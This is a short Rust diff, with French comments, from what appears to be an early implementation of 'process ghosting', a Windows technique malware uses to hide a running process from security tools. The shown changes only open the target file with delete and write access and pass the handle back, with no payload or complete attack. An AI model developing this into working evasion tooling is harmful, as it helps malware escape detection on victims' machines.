@@ -47,7 +47,7 @@ impl From<NTSTATUS> for Error {
     }
 }
 
-unsafe fn prepare_target(cible:&str) -> Option<(PVOID,u32)>{
+unsafe fn prepare_target(cible:&str) -> Option<PVOID>{
     let h_file = unsafe {CreateFileA(
          cible.as_ptr() as *const _,
          DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
@@ -81,8 +81,7 @@ unsafe fn prepare_target(cible:&str) -> Option<(PVOID,u32)>{
         unsafe{CloseHandle(h_file)};
         return None;
     }
-    // Supposons qu'ici tu retournes un mapping plus tard
-    Some((h_file as PVOID, 0))
+    return Some(h_file as PVOID);
 
 }
 
@@ -95,7 +94,13 @@ unsafe fn process_ghosting(cible:&str,fake:&str) -> Result<(), Error>{
         println!("[!] Erreur d'accès au fichier cible : {}", e);
         return Err(Error::from(STATUS_OBJECT_NAME_NOT_FOUND)); 
     }
+    
+    let h_file = match unsafe{prepare_target(cible)} {
+        Some(handle) => handle,
+        None => return Err(Error::from(STATUS_INVALID_PARAMETER)),
+    };
 
+    println!("[+] Handle de fichier obtenu: {:?}", h_file);
     Ok(())
 }
 
